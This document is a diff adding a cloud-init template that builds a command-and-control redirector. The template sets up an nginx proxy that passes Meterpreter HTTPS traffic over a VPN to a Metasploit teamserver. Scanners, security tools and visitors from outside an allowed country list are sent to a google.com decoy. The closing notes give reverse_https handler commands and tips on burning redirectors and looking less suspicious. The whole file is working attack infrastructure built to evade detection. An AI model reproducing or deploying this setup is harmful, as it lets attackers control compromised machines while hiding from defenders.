@@ -1,0 +1,317 @@
+#cloud-config
+# redirector-template.yaml — Base cloud-init template for C2 redirectors
+#
+# This is the TEMPLATE file. Do not deploy directly.
+# Use provision-redirector.sh to generate a redirector-specific YAML
+# with embedded VPN credentials and correct MSF VPN IP.
+#
+# Variables (replaced by provision-redirector.sh):
+#   {{REDIRECTOR_NAME}}  — unique name, e.g. "redirector-1"
+#   {{MSF_VPN_IP}}       — VPN IP of Metasploit teamserver, e.g. "10.8.0.6"
+#   {{MSF_PORT}}         — Metasploit handler port, e.g. "4444"
+#   {{VPN_SERVER}}       — OpenVPN hub, always "bojemoi.me"
+#   {{VPN_PORT}}         — OpenVPN port, always "1194"
+#   {{OVPN_CONFIG}}      — Inline .ovpn content (cert + key embedded)
+
+package_update: true
+package_upgrade: true
+
+packages:
+  - nginx
+  - libnginx-mod-http-geoip2
+  - openvpn
+  - certbot
+  - python3-certbot-nginx
+  - mmdb-bin
+  - geoipupdate
+  - curl
+  - ufw
+  - fail2ban
+  - openssl
+  - net-tools
+  - htop
+
+write_files:
+  # ── OpenVPN client config (inline certs) ──────────────────────────────────
+  - path: /etc/openvpn/client/{{REDIRECTOR_NAME}}.conf
+    permissions: '0600'
+    content: |
+      {{OVPN_CONFIG}}
+
+  # ── Nginx: GeoIP2 + C2 reverse proxy ─────────────────────────────────────
+  - path: /etc/nginx/nginx.conf
+    permissions: '0644'
+    content: |
+      user www-data;
+      worker_processes auto;
+      pid /run/nginx.pid;
+
+      # GeoIP2 module (installed with libnginx-mod-http-geoip2)
+      load_module modules/ngx_http_geoip2_module.so;
+
+      events {
+          worker_connections 1024;
+          multi_accept on;
+      }
+
+      http {
+          sendfile on;
+          tcp_nopush on;
+          types_hash_max_size 2048;
+          server_tokens off;
+          include /etc/nginx/mime.types;
+          default_type application/octet-stream;
+
+          # Minimal logging
+          log_format c2 '$remote_addr [$time_local] "$request" '
+                        '$status $body_bytes_sent "$http_user_agent" '
+                        '$geoip2_data_country_iso_code';
+          access_log /var/log/nginx/access.log c2;
+          error_log  /var/log/nginx/error.log warn;
+
+          # ── GeoIP2 lookup ────────────────────────────────────────────────
+          geoip2 /usr/share/GeoIP/GeoLite2-Country.mmdb {
+              auto_reload 5m;
+              $geoip2_data_country_iso_code country iso_code;
+          }
+
+          # Allowed countries (EU + UK)
+          map $geoip2_data_country_iso_code $allowed_country {
+              default 0;
+              FR  1; DE  1; BE  1; NL  1; IT  1; ES  1; GB  1;
+              CH  1; AT  1; PL  1; SE  1; NO  1; DK  1; FI  1;
+              PT  1; CZ  1; RO  1; HU  1; IE  1; LU  1; SK  1;
+              HR  1; SI  1; BG  1; LT  1; LV  1; EE  1; CY  1;
+              MT  1;
+              ""  1;  # Allow if GeoIP DB not yet downloaded
+          }
+
+          # Block scanner/automation user agents
+          map $http_user_agent $blocked_ua {
+              default     0;
+              "~*curl"    1;
+              "~*python"  1;
+              "~*perl"    1;
+              "~*ruby"    1;
+              "~*java"    1;
+              "~*nmap"    1;
+              "~*masscan" 1;
+              "~*zgrab"   1;
+              "~*shodan"  1;
+              "~*censys"  1;
+              "~*nuclei"  1;
+              "~*nikto"   1;
+              "~*dirbuster" 1;
+              "~*gobuster" 1;
+              "~*ffuf"    1;
+              "~*sqlmap"  1;
+              "~*hydra"   1;
+              "~*wfuzz"   1;
+              "~*feroxbuster" 1;
+              ""          1;  # Block empty UA
+          }
+
+          include /etc/nginx/conf.d/*.conf;
+      }
+
+  # ── C2 proxy virtual host ─────────────────────────────────────────────────
+  - path: /etc/nginx/conf.d/c2-proxy.conf
+    permissions: '0644'
+    content: |
+      # Self-signed until certbot runs
+      server {
+          listen 443 ssl http2;
+          server_name _;
+
+          ssl_certificate     /etc/nginx/ssl/self-signed.crt;
+          ssl_certificate_key /etc/nginx/ssl/self-signed.key;
+          ssl_protocols       TLSv1.2 TLSv1.3;
+          ssl_ciphers         ECDH+AESGCM:DH+AESGCM:ECDH+AES256:DH+AES256:!aNULL:!MD5:!DSS;
+          ssl_prefer_server_ciphers on;
+          ssl_session_cache   shared:SSL:10m;
+          ssl_session_timeout 10m;
+
+          # ── GeoIP filter ──────────────────────────────────────────────────
+          if ($allowed_country = 0) {
+              return 302 https://www.google.com/;
+          }
+
+          # ── Scanner UA filter ─────────────────────────────────────────────
+          if ($blocked_ua = 1) {
+              return 302 https://www.google.com/;
+          }
+
+          # ── C2 URI patterns → teamserver via VPN ──────────────────────────
+          # These patterns mirror Meterpreter HTTPS default stager URIs
+          # Adjust if using custom Malleable C2 profiles
+          location ~ "^/(api|update|assets|cdn|content|upload|download|sync|data|v[0-9]+)/" {
+              proxy_pass          https://{{MSF_VPN_IP}}:{{MSF_PORT}};
+              proxy_ssl_verify    off;
+              proxy_ssl_server_name on;
+              proxy_http_version  1.1;
+              proxy_connect_timeout 5s;
+              proxy_read_timeout    300s;
+              proxy_send_timeout    300s;
+              proxy_buffering       off;
+
+              # Forward real client IP
+              proxy_set_header X-Real-IP        $remote_addr;
+              proxy_set_header X-Forwarded-For  $proxy_add_x_forwarded_for;
+              proxy_set_header X-Forwarded-Proto $scheme;
+              proxy_set_header Host             $host;
+
+              # Strip identifying headers
+              proxy_hide_header X-Powered-By;
+              proxy_hide_header Server;
+          }
+
+          # ── Everything else → decoy (google.com redirect) ─────────────────
+          location / {
+              return 302 https://www.google.com/;
+          }
+      }
+
+      # HTTP → HTTPS
+      server {
+          listen 80;
+          server_name _;
+          return 301 https://$host$request_uri;
+      }
+
+  # ── GeoIP2 updater config (MaxMind — free account needed) ────────────────
+  - path: /etc/GeoIP.conf
+    permissions: '0644'
+    content: |
+      # Sign up at https://www.maxmind.com/en/geolite2/signup (free)
+      # Uncomment and fill in your credentials:
+      # AccountID  YOUR_ACCOUNT_ID
+      # LicenseKey YOUR_LICENSE_KEY
+      EditionIDs GeoLite2-Country GeoLite2-City
+
+  # ── Weekly GeoIP update cron ──────────────────────────────────────────────
+  - path: /etc/cron.weekly/update-geoip
+    permissions: '0755'
+    content: |
+      #!/bin/bash
+      /usr/bin/geoipupdate && systemctl reload nginx
+
+  # ── Fail2ban jail for nginx ───────────────────────────────────────────────
+  - path: /etc/fail2ban/jail.local
+    permissions: '0644'
+    content: |
+      [DEFAULT]
+      bantime  = 3600
+      findtime = 600
+      maxretry = 5
+
+      [nginx-http-auth]
+      enabled = true
+
+      [nginx-limit-req]
+      enabled  = true
+      filter   = nginx-limit-req
+      action   = iptables-multiport[name=ReqLimit, port="http,https"]
+      logpath  = /var/log/nginx/access.log
+      maxretry = 10
+
+  # ── Firewall setup ────────────────────────────────────────────────────────
+  - path: /root/setup-firewall.sh
+    permissions: '0700'
+    content: |
+      #!/bin/bash
+      ufw --force reset
+      ufw default deny incoming
+      ufw default allow outgoing
+      ufw allow 22/tcp    comment "SSH management"
+      ufw allow 80/tcp    comment "HTTP (→ HTTPS redirect)"
+      ufw allow 443/tcp   comment "HTTPS C2 proxy"
+      ufw allow out 1194/udp comment "OpenVPN to bojemoi.me"
+      ufw --force enable
+      echo "[+] Firewall configured"
+
+  # ── Main startup script ───────────────────────────────────────────────────
+  - path: /root/startup.sh
+    permissions: '0700'
+    content: |
+      #!/bin/bash
+      set -e
+      REDIRECTOR="{{REDIRECTOR_NAME}}"
+      LOG="/var/log/c2-startup.log"
+      exec > >(tee -a "$LOG") 2>&1
+
+      echo "[$(date)] Starting redirector setup: $REDIRECTOR"
+
+      # 1. Self-signed cert for initial nginx start
+      mkdir -p /etc/nginx/ssl
+      if [ ! -f /etc/nginx/ssl/self-signed.crt ]; then
+          openssl req -x509 -nodes -days 3650 -newkey rsa:2048 \
+              -keyout /etc/nginx/ssl/self-signed.key \
+              -out /etc/nginx/ssl/self-signed.crt \
+              -subj "/CN=$REDIRECTOR/O=C2/C=FR" 2>/dev/null
+          echo "[+] Self-signed cert generated"
+      fi
+
+      # 2. Start OpenVPN client
+      systemctl enable openvpn-client@$REDIRECTOR
+      systemctl start openvpn-client@$REDIRECTOR || true
+
+      # 3. Wait for VPN (max 60s)
+      echo "[*] Waiting for VPN tunnel..."
+      for i in $(seq 1 60); do
+          if ip addr show tun0 &>/dev/null 2>&1; then
+              echo "[+] VPN up: $(ip addr show tun0 | grep 'inet ' | awk '{print $2}')"
+              break
+          fi
+          [ "$i" -eq 60 ] && echo "[!] VPN timeout — nginx will start without VPN"
+          sleep 1
+      done
+
+      # 4. Apply firewall
+      /root/setup-firewall.sh
+
+      # 5. Start nginx
+      nginx -t && systemctl enable nginx && systemctl start nginx
+      echo "[+] Nginx started"
+
+      # 6. Start fail2ban
+      systemctl enable fail2ban && systemctl start fail2ban
+      echo "[+] fail2ban started"
+
+      # 7. Try GeoIP update (may fail if no MaxMind key configured)
+      geoipupdate 2>/dev/null && echo "[+] GeoIP DB updated" \
+          || echo "[!] GeoIP update skipped (configure /etc/GeoIP.conf)"
+
+      echo "[$(date)] Redirector $REDIRECTOR ready"
+      echo ""
+      echo "  VPN status : systemctl status openvpn-client@$REDIRECTOR"
+      echo "  Nginx log  : tail -f /var/log/nginx/access.log"
+      echo "  Startup log: $LOG"
+
+runcmd:
+  - hostnamectl set-hostname {{REDIRECTOR_NAME}}
+  - /root/startup.sh
+
+# ── Notes ───────────────────────────────────────────────────────────────────
+# 1. GeoIP2 filter: country block requires MaxMind license (free tier OK)
+#    Without it, $geoip2_data_country_iso_code = "" → $allowed_country = 1 (open)
+#
+# 2. MSF handler must be running BEFORE implants connect:
+#    use multi/handler
+#    set PAYLOAD windows/x64/meterpreter/reverse_https
+#    set LHOST 0.0.0.0
+#    set LPORT 4444
+#    run -j
+#
+# 3. To burn this redirector: just destroy the VPS.
+#    Other sessions via other redirectors remain active.
+#
+# 4. Cert rotation: regenerate with provision-redirector.sh --rebuild <name>
+#
+# 5. For legitimate TLS (less suspicious):
+#    certbot --nginx -d <domain> --non-interactive --agree-tos -m admin@example.com
+
+final_message: |
+  Redirector {{REDIRECTOR_NAME}} is up.
+  VPN hub: {{VPN_SERVER}}:{{VPN_PORT}}
+  MSF target: {{MSF_VPN_IP}}:{{MSF_PORT}}
+  Startup log: /var/log/c2-startup.log
